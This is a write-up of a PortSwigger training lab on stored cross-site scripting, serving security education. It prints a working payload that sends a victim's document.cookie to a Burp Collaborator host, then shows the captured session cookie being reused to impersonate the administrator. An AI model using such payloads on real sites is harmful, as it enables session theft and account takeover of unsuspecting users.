# Lab - Exploiting cross-site scripting to steal cookies

## Objective:  This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

I went to the comments section and I tried out the `<script>alert(2)<\script> payload.`

This payload did not work. 

 I went to the portswigger XSS cheat cheat and tried the following payload
 
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
![image](https://user-images.githubusercontent.com/90155329/132958876-501bb511-fcc6-4598-b98d-e9c3094a0e2f.png)
 
![image](https://user-images.githubusercontent.com/90155329/132958895-aa0d2fa1-ed26-4ee5-9ac0-0ff240aef496.png)
 
 After entering the payload, an alert box displays. This means the stored XSS worked.
 
![image](https://user-images.githubusercontent.com/90155329/132958903-b703188a-fe4b-4511-8627-04aa483376b1.png)
 
 The next step is to change the payload to steal the user's cookie. Since this is a stored XSS attack, any user who visits this page will execute the javascript. 
 
I went back to the cheatsheat and this payload looks promising

![image](https://user-images.githubusercontent.com/90155329/132958917-2a303c15-65d6-46d3-b42d-8236d5bc8485.png)

`<video><source onerror=location=/\02.rs/+document.cookie>`
	
I would need to change the location to my malicious server listening for the cookies. This lab will only send outbound requests to burpcollaborator.net which is used by Burp Pro. I was able to get a trial version. 

From Burp Pro, I went to Burp > Burp Collaborator client

![image](https://user-images.githubusercontent.com/90155329/132958930-8a102d03-cb96-4f84-baff-95db85e831f8.png)

I clicked "Copy to clipboard" to get the burp.collaborator.net FQDN

2nqn3xw3l8edc2y6w5wia7k7pyvpje.burpcollaborator.net

![image](https://user-images.githubusercontent.com/90155329/132958939-465a10dc-135c-446c-9007-cb5e83743c40.png)

Now, in the XSS payload, I will use this FQDN 

`<video><source onerror=location=/\2nqn3xw3l8edc2y6w5wia7k7pyvpje.burpcollaborator.net/+document.cookie>`
	
![image](https://user-images.githubusercontent.com/90155329/132958988-0f720f31-d4a5-4121-8a3f-dc40227a3a98.png)
	
I received the following error

![image](https://user-images.githubusercontent.com/90155329/132958974-515a3aac-a23f-45bc-8449-dc1845badeb5.png)

I dropped the payload from the Name field because it was too long.

![image](https://user-images.githubusercontent.com/90155329/132958998-0d9d6818-9552-4425-b58e-d512303e866d.png)

![image](https://user-images.githubusercontent.com/90155329/132959006-b71b0bc3-e8b8-4a2b-983f-bd95d4f5d733.png)


From the Collaborator client, I can see an HTTP request for `/secret=n0mdFU8w7BsSFNVOtkMIiUDjTmNsvDHQ;%20session=gimJNMnGHeTwVAkPn4GAIa0ga8s2LjxD`

![image](https://user-images.githubusercontent.com/90155329/132959012-4220dfc1-f562-4d6e-8284-ce39f037382e.png)

This is probably the cookie for another user who was victim to the cookie stealing stored XSS payload. I took it and replaced my own cookie with `gimJNMnGHeTwVAkPn4GAIa0ga8s2LjxD`

![image](https://user-images.githubusercontent.com/90155329/132959028-408ea2f6-cca7-4b65-ac57-ecf6556afb2e.png)

After replacing my cookie, I passed the lab!

![image](https://user-images.githubusercontent.com/90155329/132959032-54fe1efb-bea0-400f-906d-9662653dd32d.png)

I clicked to "My account" and I can see that the cookie I used was the Administrator user.

![image](https://user-images.githubusercontent.com/90155329/132959037-513bd638-6595-4802-9264-c8b2a4ffa74c.png)
